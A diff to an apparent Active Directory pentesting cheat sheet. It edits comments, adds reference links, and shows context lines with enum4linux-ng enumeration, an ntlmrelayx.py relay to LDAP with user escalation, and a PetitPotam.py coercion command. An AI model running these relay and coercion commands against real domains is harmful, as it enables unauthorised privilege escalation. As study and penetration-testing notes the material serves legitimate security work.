@@ -47,7 +47,7 @@ service scan, domain information, check for ```null sessions```, shares
 
 ```shell
 enum4linux-ng -A <target ip> 
-# all simple enumeration
+# -A all simple enumeration
 ```
 
 Enumerating Users
@@ -59,12 +59,15 @@ add target domain /etc/hosts, if needed
 <target domain ip> <Active Directory Domain>
 ```
 
-NTLM Relay
+NTLM relay attack
+
+https://en.hackndo.com/ntlm-relay/
+https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr
 
 ```shell
 # listening
 python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://<attacker ip> -smb2support  
-# 
+# launch
 python3 PetitPotam.py -d <domain> -u <username> -p <password> <attacker ip> <target ip>
 ```
 
